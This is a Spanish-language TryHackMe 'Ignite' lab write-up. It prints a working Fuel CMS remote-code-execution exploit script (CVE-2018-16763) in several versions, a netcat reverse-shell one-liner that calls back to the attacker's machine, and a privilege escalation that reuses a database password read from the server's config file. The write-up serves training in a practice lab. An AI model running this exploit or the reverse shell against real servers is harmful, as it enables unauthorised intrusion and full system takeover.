---
title: Try Hack Me - Ignite - Writeup
date: 2022-09-20 10:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a resolver el room [Ignite](https://tryhackme.com/room/ignite) de [THM](https://tryhackme.com) creado por [DarkStar7471](https://tryhackme.com/p/DarkStar7471) en el que nos aprovecharemos de un CMS vulnerable para obtener acceso y escalar privilegios.

Dentro música.

## Inicio

En este caso, la información disponible en el room es nula, así que iniciamos la máquina y enumeramos con **nmap**.

## Enumeración

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ RIP=10.10.254.226

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ nmap -sC -sV $RIP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 16:36 CEST
Nmap scan report for 10.10.254.226
Host is up (0.077s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry
|_/fuel/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.82 seconds
```

Significado de las flags:

* `-sC`&nbsp;: devuelve información sobre la versión de los servicios corriendo en los puertos abiertos.
* `-sV`&nbsp;: realiza un escaneo utilizando el conjunto de scripts por defecto de **nmap**.

El volcado de **nmap** nos cuenta que tenemos el puerto *80/tcp* con un servicio **http** escuchando. También nos brinda información sobre un directorio exluido en el fichero `robot.txt`.

Cargamos la IP en el navegador y nos muestra lo siguiente:

![](/assets/posts/20220920/img02.png)

Lo que tenemos aquí es una implementación de **Fuel CMS** en la versión **1.4**.

Toca buscar si exite algún exploit conocido para nuestro nuevo amigo. Para ello nos vamos a Exploit Database y encontramos [esto](https://www.exploit-db.com/exploits/47138): un script en python que nos permite ejecutar código remoto.

Lo copiamos y lo guardamos en nuestro directorio de trabajo con el nombre `ignite.py`&nbsp;.


```
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

import requests
import urllib

url = "http://127.0.0.1:8881"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```

Le echamos un ojo y vemos que hay un par de cosas que modificar.

* El valor de la variable `url`&nbsp; debe ser el de nuestro servidor remoto.

* La función `raw_input()`&nbsp; ha sido renombrada como `input()`&nbsp; en **python3**.

* La variable `proxy`&nbsp; no la necesitamos.

* La función `print`&nbsp; hay que reescribirla para **python3**.

Tras los cambios, el fichero `ignite.py`&nbsp; nos queda tal que así:

```
import requests
import urllib

url = "http://10.10.254.226"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"

	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print(r.text[0:dup])
```

Lo ejecutamos a ver si funciona

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ python3 ignite.py
cmd:
```

OK. Aprovechando que podemos ejecutar comandos en el servidor remoto, vamos a pedirle que se conecte a nuestra máquina local via **netcat** al puerto *4433*. Para eso utilizamos el siguiente código.

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TUNEL_IP> 4433 > /tmp/f
```

Donde `<TUNEL_IP>`&nbsp; es la IP con la que nuestro equipo se conecta a THM via VPN. Para saber cuál es podemos ejecutar `ip a`&nbsp; en nuestro terminal y echar un ojo a la interface ***tun0***.

Abrimos un nuevo terminal en nuestra máquina y ponemos a escuchar a **nc**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ nc -lvp 4433
listening on [any] 4433 ...
```

Copiamos el código anterior y lo pegamos en el terminal donde hemos lanzado el script en python.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ python3 ignite.py
cmd:rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.18.xx.xx 4433 > /tmp/f
Traceback (most recent call last):
  File "/home/ewan67/Documents/Cybersecurity/THM/Ignite/ignite.py", line 14, in <module>
    burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
AttributeError: module 'urllib' has no attribute 'quote'
```

Malo. Buscamos el error en internet y damos con [esto](https://stackoverflow.com/questions/31827012/python-importing-urllib-quote).

Toca modificar el fichero.

```
import requests
import urllib.parse

url = "http://10.10.254.226"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx
)+"%27%29%2b%27"

        r = requests.get(burp0_url)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print(r.text[0:dup])
```

Repetimos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ python3 ignite.py
cmd:rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.18.xx.xx 4433 > /tmp/f

```

De momento OK. Nos vamos al terminal donde tenemos escuchando a **netcat** y esperamos unos segundos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ nc -lvp 4433
listening on [any] 4433 ...
10.10.254.226: inverse host lookup failed: Unknown host
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.254.226] 55288
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Se hizo la magia. Upgradeamos la shell que tenemos a bash con el comando:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Y nos ponemos a trastear.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ nc -lvp 4433
listening on [any] 4433 ...
10.10.254.226: inverse host lookup failed: Unknown host
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.254.226] 55288
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
<MODIFICADO>
www-data@ubuntu:/home/www-data$
```

Tenemos la primer flag.

## Escalado de privilegios

Después de probar varias cosas sin éxito me doy de narices con el siguiente párrafo de la home del CMS.

![](/assets/posts/20220920/img03.png)

> Después de crear la base de datos, cambie la configuración de la base de datos que se encuentra en **fuel/application/config/database.php** para incluir su nombre de host (por ejemplo, localhost), nombre de usuario, contraseña y la base de datos para que coincida con la nueva base de datos que ha creado.

<br>

Vamos para allí.


```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Ignite]
└─$ nc -lvp 4433
listening on [any] 4433 ...
[...]
www-data@ubuntu:/home/www-data$
www-data@ubuntu:/home/www-data$ cd /var/www/html/fuel/application/config
cd /var/www/html/fuel/application/config
www-data@ubuntu:/var/www/html/fuel/application/config$ ls
ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
www-data@ubuntu:/var/www/html/fuel/application/config$ cat /var/www/html/fuel/application/config/database.php
<$ cat /var/www/html/fuel/application/config/database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
[...]
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => '<MODIFICADO>',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
www-data@ubuntu:/var/www/html/fuel/application/config$
```

Bingo !

```console
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
su root
Password: <MODIFICADO>

root@ubuntu:/var/www/html/fuel/application/config# ls
ls
asset.php          editors.php        migration.php        profiler.php
autoload.php       environments.php   mimes.php            redirects.php
config.php         foreign_chars.php  model.php            routes.php
constants.php      google.php         MY_config.php        smileys.php
custom_fields.php  hooks.php          MY_fuel_layouts.php  social.php
database.php       index.html         MY_fuel_modules.php  states.php
doctypes.php       memcached.php      MY_fuel.php          user_agents.php
root@ubuntu:/var/www/html/fuel/application/config# cd
cd
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
<MODIFICADO>
root@ubuntu:~#
```

Nos hacemos con la flag de *root* y final de la peli.

Espero que esta guía os haya servido de ayuda.

Saludos he intentar ser felices.